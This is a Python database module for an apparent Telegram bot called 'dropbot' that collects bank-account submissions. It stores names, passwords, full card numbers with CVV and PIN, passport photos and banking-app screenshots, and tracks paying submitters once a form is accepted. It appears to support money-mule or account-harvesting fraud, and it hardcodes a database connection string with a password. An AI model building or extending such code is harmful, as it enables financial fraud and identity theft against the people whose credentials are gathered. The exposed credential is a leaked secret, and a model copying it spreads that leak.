import os
import asyncio
import asyncpg
import psycopg2
from psycopg2.extras import RealDictCursor
import datetime
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

DATABASE_URL = "postgresql://neondb_owner:npg_KRCOcY3gMBF0@ep-wild-recipe-a22cuijo-pooler.eu-central-1.aws.neon.tech/dropbot"

def get_sync_connection():
    """Get synchronous PostgreSQL connection"""
    return psycopg2.connect(DATABASE_URL, cursor_factory=RealDictCursor)

async def get_async_connection():
    """Get asynchronous PostgreSQL connection"""
    return await asyncpg.connect(DATABASE_URL)

async def init_database():
    """Initialize PostgreSQL database with required tables"""
    conn = await get_async_connection()
    try:
        # Forms table
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS forms (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                bank TEXT,
                fullname TEXT,
                email TEXT,
                phone TEXT,
                password TEXT,
                card_number TEXT,
                card_expiry TEXT,
                card_cvv TEXT,
                card_pin TEXT,
                passport_photo1 TEXT,
                passport_photo2 TEXT,
                enforcement_photo TEXT,
                bank_name_photo TEXT,
                bank_phone_photo TEXT,
                bank_email_photo TEXT,
                bank_income_photo TEXT,
                bank_p2p_photo TEXT,
                deletion_photo TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'Надіслано',
                substatus TEXT,
                rejection_reason TEXT,
                username TEXT
            )
        """)
        
        # User statistics table
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS user_stats (
                user_id BIGINT PRIMARY KEY,
                emails_received INTEGER DEFAULT 0,
                forms_submitted INTEGER DEFAULT 0,
                last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        print("Database tables initialized successfully")
    finally:
        await conn.close()

def update_user_stats_sync(user_id, emails_received=0, forms_submitted=0, username=None):
    """Update user statistics using synchronous connection"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO user_stats (user_id, emails_received, forms_submitted, last_activity, username)
            VALUES (%(user_id)s, %(emails_received)s, %(forms_submitted)s, %(last_activity)s, %(username)s)
            ON CONFLICT (user_id) 
            DO UPDATE SET 
                emails_received = user_stats.emails_received + %(emails_received)s,
                forms_submitted = user_stats.forms_submitted + %(forms_submitted)s,
                last_activity = %(last_activity)s,
                username = COALESCE(%(username)s, user_stats.username)
        """, {
            'user_id': user_id,
            'emails_received': emails_received,
            'forms_submitted': forms_submitted,
            'last_activity': datetime.datetime.now(),
            'username': username
        })
        conn.commit()
    finally:
        conn.close()

async def save_form_data(user_id, bank, fullname, email, phone, password, card_number, card_expiry, card_cvv, card_pin, passport_photo1, passport_photo2, enforcement_photo, bank_name_photo, bank_phone_photo, bank_email_photo, bank_income_photo, bank_p2p_photo, deletion_photo, username=None):
    """Save form data to PostgreSQL database"""
    conn = await get_async_connection()
    try:
        await conn.execute("""
            INSERT INTO forms (user_id, bank, fullname, email, phone, password, card_number, card_expiry, card_cvv, card_pin, passport_photo1, passport_photo2, enforcement_photo, bank_name_photo, bank_phone_photo, bank_email_photo, bank_income_photo, bank_p2p_photo, deletion_photo, timestamp, status, username)
            VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20, $21, $22)
        """, user_id, bank, fullname, email, phone, password, card_number, card_expiry, card_cvv, card_pin, passport_photo1, passport_photo2, enforcement_photo, bank_name_photo, bank_phone_photo, bank_email_photo, bank_income_photo, bank_p2p_photo, deletion_photo, datetime.datetime.now(), 'Надіслано', username)
    finally:
        await conn.close()

def get_user_forms_count_sync(user_id):
    """Get count of forms submitted by user from user_stats table (authoritative source)"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT forms_submitted FROM user_stats WHERE user_id = %s", (user_id,))
        result = cursor.fetchone()
        if result:
            if hasattr(result, 'get'):  # dict-like access
                return result.get('forms_submitted', 0)
            elif hasattr(result, '_asdict'):  # namedtuple-like
                return result._asdict().get('forms_submitted', 0)
            elif isinstance(result, (tuple, list)) and len(result) > 0:
                return result[0] or 0
        return 0
    except Exception as e:
        print(f"Error in get_user_forms_count_sync: {e}")
        return 0
    finally:
        conn.close()

async def get_user_forms_count_async(user_id):
    """Get count of forms submitted by user using asynchronous connection"""
    conn = await get_async_connection()
    try:
        result = await conn.fetchval("SELECT COUNT(*) FROM forms WHERE user_id = $1", user_id)
        return result or 0
    finally:
        await conn.close()

def get_all_forms_sync():
    """Get all forms using synchronous connection"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM forms ORDER BY timestamp DESC")
        return cursor.fetchall()
    finally:
        conn.close()

def get_database_stats_sync():
    """Get database statistics using synchronous connection"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        
        # Total forms
        cursor.execute("SELECT COUNT(*) FROM forms")
        result = cursor.fetchone()
        total_forms = result[0] if result else 0
        
        # Total users
        cursor.execute("SELECT COUNT(DISTINCT user_id) FROM forms")
        result = cursor.fetchone()
        total_users = result[0] if result else 0
        
        # Forms by bank
        cursor.execute("SELECT bank, COUNT(*) as count FROM forms GROUP BY bank ORDER BY count DESC")
        forms_by_bank = cursor.fetchall()
        
        # Recent forms (last 24 hours)
        cursor.execute("""
            SELECT COUNT(*) FROM forms 
            WHERE timestamp > NOW() - INTERVAL '24 hours'
        """)
        result = cursor.fetchone()
        recent_forms = result[0] if result else 0
        
        return {
            'total_forms': total_forms,
            'total_users': total_users,
            'forms_by_bank': forms_by_bank,
            'recent_forms': recent_forms
        }
    finally:
        conn.close()

def get_user_forms_sync(user_id):
    """Get all forms for a specific user"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("""
            SELECT id, bank, fullname, status, substatus, rejection_reason, timestamp 
            FROM forms WHERE user_id = %s ORDER BY timestamp DESC
        """, (user_id,))
        return cursor.fetchall()
    finally:
        conn.close()

def get_next_pending_form_sync():
    """Get the oldest form with 'Надіслано' status"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("""
            SELECT * FROM forms WHERE status = 'Надіслано' 
            ORDER BY timestamp ASC LIMIT 1
        """)
        return cursor.fetchone()
    finally:
        conn.close()

def get_accepted_forms_sync():
    """Get all forms with 'Прийнято' status"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("""
            SELECT id, user_id, bank, fullname, email, phone, substatus, timestamp 
            FROM forms WHERE status = 'Прийнято' 
            ORDER BY timestamp DESC
        """)
        return cursor.fetchall()
    finally:
        conn.close()

def get_form_by_id_sync(form_id):
    """Get specific form by ID"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM forms WHERE id = %s", (form_id,))
        return cursor.fetchone()
    finally:
        conn.close()

def update_form_status_sync(form_id, status, substatus=None, rejection_reason=None):
    """Update form status and related fields"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("""
            UPDATE forms SET 
                status = %s, 
                substatus = %s, 
                rejection_reason = %s, 
                processed_at = %s 
            WHERE id = %s
        """, (status, substatus, rejection_reason, datetime.datetime.now(), form_id))
        conn.commit()
    finally:
        conn.close()

def update_payment_status_sync(form_id, payment_status, amount=None):
    """Update payment status and amount"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("""
            UPDATE forms SET 
                payment_status = %s,
                payment_amount = %s,
                payment_requested_at = %s
            WHERE id = %s
        """, (payment_status, amount, datetime.datetime.now(), form_id))
        conn.commit()
    finally:
        conn.close()

def save_payment_card_sync(form_id, card_number):
    """Save payment card number"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("""
            UPDATE forms SET 
                payment_card_photo = %s,
                payment_status = 'Картка надіслана'
            WHERE id = %s
        """, (card_number, form_id))
        conn.commit()
    finally:
        conn.close()

def save_payment_receipt_sync(form_id, receipt_photo_id):
    """Save payment receipt photo and complete payment"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("""
            UPDATE forms SET 
                payment_receipt_photo = %s,
                payment_status = 'Оплачено',
                status = 'Оплачено',
                substatus = 'Оплачено',
                payment_completed_at = %s
            WHERE id = %s
        """, (receipt_photo_id, datetime.datetime.now(), form_id))
        conn.commit()
    finally:
        conn.close()

def get_pending_forms_count_sync():
    """Get count of pending forms"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) as count FROM forms WHERE status = %s", ('Надіслано',))
        result = cursor.fetchone()
        if result:
            # Handle RealDictRow result from psycopg2
            if hasattr(result, 'get'):  # dict-like access
                return result.get('count', 0)
            elif hasattr(result, '_asdict'):  # namedtuple-like
                return result._asdict().get('count', 0)
            elif isinstance(result, (tuple, list)) and len(result) > 0:
                return result[0]
        return 0
    except Exception as e:
        print(f"Error in get_pending_forms_count_sync: {e}")
        return 0
    finally:
        conn.close()

def get_username_by_user_id_sync(user_id):
    """Get fullname from latest form or return user_id if not found"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT fullname FROM forms WHERE user_id = %s ORDER BY timestamp DESC LIMIT 1", (user_id,))
        result = cursor.fetchone()
        if result:
            if hasattr(result, 'get'):  # dict-like access
                return result.get('fullname', f"ID_{user_id}")
            elif hasattr(result, '_asdict'):  # namedtuple-like
                return result._asdict().get('fullname', f"ID_{user_id}")
            elif isinstance(result, (tuple, list)) and len(result) > 0:
                return result[0]
        return f"ID_{user_id}"
    except Exception as e:
        print(f"Error in get_username_by_user_id_sync: {e}")
        return f"ID_{user_id}"
    finally:
        conn.close()

def get_all_user_ids_sync():
    """Get all user IDs from database"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT DISTINCT user_id FROM user_stats")
        results = cursor.fetchall()
        user_ids = []
        for result in results:
            if hasattr(result, 'get'):  # dict-like access
                user_ids.append(result.get('user_id'))
            elif hasattr(result, '_asdict'):  # namedtuple-like
                user_ids.append(result._asdict().get('user_id'))
            elif isinstance(result, (tuple, list)) and len(result) > 0:
                user_ids.append(result[0])
        return user_ids
    except Exception as e:
        print(f"Error in get_all_user_ids_sync: {e}")
        return []
    finally:
        conn.close()

def get_user_email_count_sync(user_id):
    """Get email count for specific user from database"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT emails_received FROM user_stats WHERE user_id = %s", (user_id,))
        result = cursor.fetchone()
        if result:
            if hasattr(result, 'get'):  # dict-like access
                return result.get('emails_received', 0)
            elif hasattr(result, '_asdict'):  # namedtuple-like
                return result._asdict().get('emails_received', 0)
            elif isinstance(result, (tuple, list)) and len(result) > 0:
                return result[0] or 0
        return 0
    except Exception as e:
        print(f"Error in get_user_email_count_sync: {e}")
        return 0
    finally:
        conn.close()

def get_user_forms_count_sync(user_id):
    """Get submitted forms count for specific user"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM forms WHERE user_id = %s", (user_id,))
        result = cursor.fetchone()
        if result:
            if hasattr(result, 'get'):  # dict-like access
                return result.get('count', 0) or 0
            elif hasattr(result, '_asdict'):  # namedtuple-like
                return result._asdict().get('count', 0) or 0
            elif isinstance(result, (tuple, list)) and len(result) > 0:
                return result[0] or 0
        return 0
    except Exception as e:
        print(f"Error in get_user_forms_count_sync: {e}")
        return 0
    finally:
        conn.close()

def get_user_available_emails_limit(user_id):
    """Calculate available email limit for user: 3 base + (forms_count * 3)"""
    forms_count = get_user_forms_count_sync(user_id)
    return 3 + (forms_count * 3)

def get_user_telegram_info_sync(user_id):
    """Get telegram username from user_stats table"""
    conn = get_sync_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT username FROM user_stats WHERE user_id = %s", (user_id,))
        result = cursor.fetchone()
        if result:
            if hasattr(result, 'get'):  # dict-like access
                username = result.get('username')
                return f"@{username}" if username else f"ID_{user_id}"
            elif hasattr(result, '_asdict'):  # namedtuple-like
                username = result._asdict().get('username')
                return f"@{username}" if username else f"ID_{user_id}"
            elif isinstance(result, (tuple, list)) and len(result) > 0 and result[0]:
                return f"@{result[0]}"
        return f"ID_{user_id}"
    except Exception as e:
        print(f"Error in get_user_telegram_info_sync: {e}")
        return f"ID_{user_id}"
    finally:
        conn.close()
